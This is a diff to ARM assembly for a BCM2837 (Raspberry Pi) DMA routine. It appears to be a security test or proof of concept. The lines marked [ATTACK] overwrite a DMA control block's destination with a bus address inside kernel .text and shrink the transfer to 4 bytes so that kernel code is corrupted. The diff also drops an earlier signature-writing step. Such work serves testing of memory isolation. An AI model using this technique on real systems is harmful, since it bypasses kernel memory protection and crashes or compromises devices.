@@ -1430,28 +1430,16 @@ b 99f
 	// CB structure: [info:4][src:4][dst:4][len:4][stride:4][next:4]
 	// ==========================================================
 	
-	// [ATTACK] First, write a unique signature to the source buffer
-	// This proves the data came from OUR attack, not random corruption
-	// Signature: 0xDEAD0001, 0xDEAD0002, 0xDEAD0003, 0xDEAD0004
-	ldr	r0, [r2, #0x04]		// Get src bus address
-	sub	r0, r0, #BCM2837_BUS_VIRT_OFFSET	// Convert to virtual
-	ldr	r1, =0xDEAD0001
-	str	r1, [r0, #0x00]		// Write signature word 1
-	ldr	r1, =0xDEAD0002
-	str	r1, [r0, #0x04]		// Write signature word 2
-	ldr	r1, =0xDEAD0003
-	str	r1, [r0, #0x08]		// Write signature word 3
-	ldr	r1, =0xDEAD0004
-	str	r1, [r0, #0x0C]		// Write signature word 4
-	dmb
-	
 	// [ATTACK] Modify dst to point to KERNEL TEXT!
-	ldr	r1, =0xC0208000		// Bus addr of 0x00208000 (inside kernel .text!)
-	str	r1, [r2, #0x08]		// Overwrite dst field with forbidden address
+	// Target: 0xC0208000 = bus addr of physical 0x00208000
+	// This is inside kernel .text (0x00200000 - 0x00A00000)
+	ldr	r1, =0xC0208000		// Bus addr of kernel .text
+	str	r1, [r2, #0x08]		// Overwrite CB.dst with forbidden address
 	
-	// [ATTACK] Set transfer length to write our 16-byte signature
-	mov	r1, #16			// Write exactly 16 bytes (4 signature words)
-	str	r1, [r2, #0x0C]		// Overwrite length field
+	// [ATTACK] Set transfer length to corrupt kernel code
+	// Even 4 bytes is enough to cause crash when code is executed
+	mov	r1, #4			// Write 4 bytes (1 instruction)
+	str	r1, [r2, #0x0C]		// Overwrite CB.length
 	
 	dmb
 	isb
